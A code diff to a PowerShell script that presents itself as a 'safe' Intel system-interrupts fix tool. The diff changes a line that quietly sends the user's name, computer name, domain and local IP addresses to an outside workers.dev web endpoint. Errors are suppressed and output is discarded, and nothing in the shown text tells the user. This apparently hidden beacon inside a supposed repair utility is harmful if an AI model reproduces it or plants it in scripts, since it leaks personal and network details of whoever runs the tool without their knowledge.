@@ -1,4 +1,4 @@
-# ==========================================================
+﻿# ==========================================================
 # INTEL SYSTEM INTERRUPTS AUTO FIX TOOL
 # Safe | Automated | Factory Ready | PowerShell Native
 # Version: 1.0.5 CLEAN (sandbox + encoding aware)
@@ -31,7 +31,7 @@ try {
         text  = "System Interrupt Fix v1.0.5`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 # -----------------------------
 # UI: black background + bright colors
